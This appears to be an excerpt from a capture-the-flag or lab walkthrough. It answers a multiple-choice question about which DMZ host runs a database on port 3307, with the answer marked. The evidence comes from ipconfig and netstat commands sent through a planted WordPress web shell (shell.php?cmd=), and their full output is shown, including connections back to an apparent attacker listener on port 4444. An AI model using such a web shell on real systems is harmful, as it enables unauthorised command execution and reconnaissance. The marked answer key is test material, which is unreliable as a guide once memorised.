## 26. What host on the DMZ network is running a database server on port 3307?

192.168.100.52

192.168.0.100

| __192.168.100.50__

192.168.100.51

view-source:http://192.168.100.50/wordpress/shell.php?cmd=ipconfig
```bash
Windows IP Configuration
Ethernet adapter Ethernet 2:

   Connection-specific DNS Suffix  . : us-west-1.compute.internal
   Link-local IPv6 Address . . . . . : fe80::e09a:d08e:b7aa:df97%12
   IPv4 Address. . . . . . . . . . . : 192.168.100.50
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.100.1

Tunnel adapter isatap.us-west-1.compute.internal:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . : us-west-1.compute.internal
   Connection-specific DNS Suffix  . : us-west-1.compute.internal
```

view-source:http://192.168.100.50/wordpress/shell.php?cmd=netstat%20-ano
```bash

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       1424
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       860
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:3307           0.0.0.0:0              LISTENING       1516
  TCP    0.0.0.0:3389           0.0.0.0:0              LISTENING       2296
  TCP    0.0.0.0:5985           0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:47001          0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:49152          0.0.0.0:0              LISTENING       688
  TCP    0.0.0.0:49153          0.0.0.0:0              LISTENING       960
  TCP    0.0.0.0:49154          0.0.0.0:0              LISTENING       984
  TCP    0.0.0.0:49155          0.0.0.0:0              LISTENING       1176
  TCP    0.0.0.0:49169          0.0.0.0:0              LISTENING       764
  TCP    0.0.0.0:49174          0.0.0.0:0              LISTENING       756
  TCP    127.0.0.1:62032        127.0.0.1:3307         TIME_WAIT       0
  TCP    192.168.100.50:80      192.168.100.5:36046    CLOSE_WAIT      1424
  TCP    192.168.100.50:80      192.168.100.5:36180    CLOSE_WAIT      1424
  TCP    192.168.100.50:80      192.168.100.5:36224    TIME_WAIT       0
  TCP    192.168.100.50:80      192.168.100.5:36230    ESTABLISHED     1424
  TCP    192.168.100.50:139     0.0.0.0:0              LISTENING       4
  TCP    192.168.100.50:59844   192.168.100.5:4444     CLOSE_WAIT      1804
  TCP    192.168.100.50:59871   192.168.100.5:4444     CLOSE_WAIT      1804
  TCP    192.168.100.50:60772   192.168.100.5:4411     CLOSE_WAIT      1804
  TCP    192.168.100.50:61836   192.168.100.5:4411     CLOSE_WAIT      1804
  TCP    192.168.100.50:62036   3.101.232.156:443      SYN_SENT        1524
  TCP    192.168.100.50:62037   3.101.233.171:443      SYN_SENT        1524
  TCP    [::]:80                [::]:0                 LISTENING       1424
  TCP    [::]:135               [::]:0                 LISTENING       860
  TCP    [::]:445               [::]:0                 LISTENING       4
  TCP    [::]:3307              [::]:0                 LISTENING       1516
  TCP    [::]:3389              [::]:0                 LISTENING       2296
  TCP    [::]:5985              [::]:0                 LISTENING       4
  TCP    [::]:47001             [::]:0                 LISTENING       4
  TCP    [::]:49152             [::]:0                 LISTENING       688
  TCP    [::]:49153             [::]:0                 LISTENING       960
  TCP    [::]:49154             [::]:0                 LISTENING       984
  TCP    [::]:49155             [::]:0                 LISTENING       1176
  TCP    [::]:49169             [::]:0                 LISTENING       764
  TCP    [::]:49174             [::]:0                 LISTENING       756
  UDP    0.0.0.0:500            *:*                                    984
  UDP    0.0.0.0:3389           *:*                                    2296
  UDP    0.0.0.0:4500           *:*                                    984
  UDP    0.0.0.0:5355           *:*                                    588
  UDP    192.168.100.50:137     *:*                                    4
  UDP    192.168.100.50:138     *:*                                    4
  UDP    [::]:500               *:*                                    984
  UDP    [::]:3389              *:*                                    2296
  UDP    [::]:4500              *:*                                    984
  UDP    [::]:5355              *:*                                    588
  UDP    [::]:5355              *:*                                    588
  ```